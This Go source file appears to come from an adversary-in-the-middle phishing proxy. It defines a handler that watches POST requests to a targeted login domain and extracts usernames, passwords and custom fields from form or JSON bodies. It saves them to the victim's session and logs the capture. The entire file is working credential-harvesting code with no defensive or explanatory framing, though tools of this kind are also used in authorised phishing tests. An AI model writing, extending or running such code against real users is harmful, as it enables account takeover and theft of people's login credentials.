package request

import (
	"log/slog"
	"net/http"
	"net/url"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

type credentialCapturer interface {
	CaptureCredentials(session *aitm.Session) error
}

// CredentialExtractor captures username and password from matching login requests.
type CredentialExtractor struct {
	Capturer credentialCapturer
	Logger   *slog.Logger
}

func (h *CredentialExtractor) Name() string { return "CredentialExtractor" }

func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil || ctx.Session == nil {
		return nil
	}
	if !matchesLoginDomain(ctx.Phishlet.Login, req) {
		return nil
	}
	bodyBytes, err := getRequestBody(ctx, req)
	if err != nil || len(bodyBytes) == 0 {
		return nil
	}

	updated := false
	rules := ctx.Phishlet.Credentials

	if username := extractField(rules.Username, bodyBytes, req); username != "" && ctx.Session.Username == "" {
		ctx.Session.Username = username
		updated = true
	}
	if password := extractField(rules.Password, bodyBytes, req); password != "" && ctx.Session.Password == "" {
		ctx.Session.Password = password
		updated = true
	}
	for _, customRule := range rules.Custom {
		if value := extractField(customRule.CredentialRule, bodyBytes, req); value != "" {
			if ctx.Session.Custom == nil {
				ctx.Session.Custom = make(map[string]string)
			}
			ctx.Session.Custom[customRule.Name] = value
			updated = true
		}
	}

	if updated {
		if err := h.Capturer.CaptureCredentials(ctx.Session); err != nil {
			h.Logger.Warn("failed to persist captured credentials", "session_id", ctx.Session.ID, "error", err)
		} else {
			h.Logger.Info("credentials captured",
				"session_id", ctx.Session.ID,
				"phishlet", ctx.Session.Phishlet,
				"username", ctx.Session.Username,
			)
		}
	}
	return nil
}

func matchesLoginDomain(login aitm.LoginSpec, req *http.Request) bool {
	if req.Method != http.MethodPost {
		return false
	}
	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(hostWithoutPort(req.Host)), strings.ToLower(login.Domain)) {
		return false
	}
	return true
}

func extractField(rule aitm.CredentialRule, body []byte, req *http.Request) string {
	switch rule.Type {
	case "post":
		parsed, err := url.ParseQuery(string(body))
		if err != nil {
			return ""
		}
		for key, values := range parsed {
			if rule.Key != nil && rule.Key.MatchString(key) {
				for _, value := range values {
					if rule.Search == nil {
						return value
					}
					if matches := rule.Search.FindStringSubmatch(value); len(matches) > 1 {
						return matches[1]
					}
				}
			}
		}
	case "json":
		if rule.Key != nil && rule.Search != nil {
			if matches := rule.Search.FindSubmatch(body); len(matches) > 1 {
				return string(matches[1])
			}
		}
	}
	return ""
}

var _ proxy.RequestHandler = (*CredentialExtractor)(nil)
